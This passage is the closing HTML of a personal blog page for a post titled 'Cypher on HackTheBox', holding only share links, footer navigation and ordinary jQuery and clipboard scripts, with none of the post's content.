+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/03/18/htb-cypher/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/03/18/htb-cypher/&text=Cypher on HackTheBox"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/03/18/htb-cypher/&title=Cypher on HackTheBox"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/03/18/htb-cypher/&is_video=false&description=Cypher on HackTheBox"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Cypher on HackTheBox&body=Check out this article: http://wha13.github.io/2025/03/18/htb-cypher/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/03/18/htb-cypher/&title=Cypher on HackTheBox"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/03/18/htb-cypher/&title=Cypher on HackTheBox"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/03/18/htb-cypher/&title=Cypher on HackTheBox"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/03/18/htb-cypher/&title=Cypher on HackTheBox"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/03/18/htb-cypher/&name=Cypher on HackTheBox&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/03/18/htb-cypher/&t=Cypher on HackTheBox"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2026
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
